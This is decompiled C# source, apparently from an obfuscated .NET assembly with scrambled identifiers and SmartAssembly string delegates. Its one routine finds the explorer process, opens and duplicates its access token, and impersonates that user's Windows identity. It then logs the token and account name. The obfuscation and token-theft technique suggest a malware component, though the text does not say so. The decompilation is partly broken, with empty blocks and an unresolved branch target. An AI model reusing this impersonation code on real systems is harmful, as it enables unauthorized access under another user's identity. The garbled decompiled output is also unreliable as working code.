using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Principal;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace coxZRmDhvSAWo;

internal sealed class c00002c
{
	[NonSerialized]
	internal static GetString f000067;

	[DllImport("advapi32", SetLastError = true)]
	[SuppressUnmanagedCodeSecurity]
	private static extern int OpenProcessToken(IntPtr p0, int p1, ref IntPtr p2);

	[DllImport("kernel32", SetLastError = true)]
	[SuppressUnmanagedCodeSecurity]
	private static extern bool CloseHandle(IntPtr p0);

	[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern bool DuplicateToken(IntPtr p0, int p1, ref IntPtr p2);

	private static IntPtr LLoExEoeePHnHZ(IntPtr p0, int p1)
	{
		IntPtr p2 = IntPtr.Zero;
		DuplicateToken(p0, p1, ref p2);
		return p2;
	}

	public static void AQxYtYywpEIpR()
	{
		try
		{
			IntPtr p = IntPtr.Zero;
			IntPtr zero = IntPtr.Zero;
			Process process = null;
			Process[] processes = Process.GetProcesses();
			foreach (Process process2 in processes)
			{
				if (process2.ProcessName == "explorer")
				{
					process = process2;
				}
			}
			if (OpenProcessToken(process.Handle, 14, ref p) == 0)
			{
				return;
			}
			WindowsIdentity windowsIdentity = new WindowsIdentity(p);
			if (!GhAMvbuoccW.f000029)
			{
				/*Error: Could not find block for branch target IL_0076*/;
			}
			try
			{
			}
			catch (Exception)
			{
			}
			try
			{
				zero = LLoExEoeePHnHZ(p, 2);
				if (IntPtr.Zero == zero)
				{
				}
				windowsIdentity.Impersonate();
				IntPtr token = WindowsIdentity.GetCurrent().Token;
				if (GhAMvbuoccW.f000029)
				{
					try
					{
						Console.WriteLine("Impersonation-> Token number: {0}", token);
						Console.WriteLine("Impersonation-> Windows ID Name: {0}", WindowsIdentity.GetCurrent().Name);
						return;
					}
					catch (Exception)
					{
						return;
					}
				}
			}
			finally
			{
				CloseHandle(p);
			}
		}
		catch (Exception ex3)
		{
			if (GhAMvbuoccW.CCDyMIHlAe)
			{
				try
				{
					File.AppendAllText(GhAMvbuoccW.f000025, "Error while impersonating: " + ex3.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	static c00002c()
	{
		Strings.CreateGetStringDelegate(typeof(c00002c));
	}
}
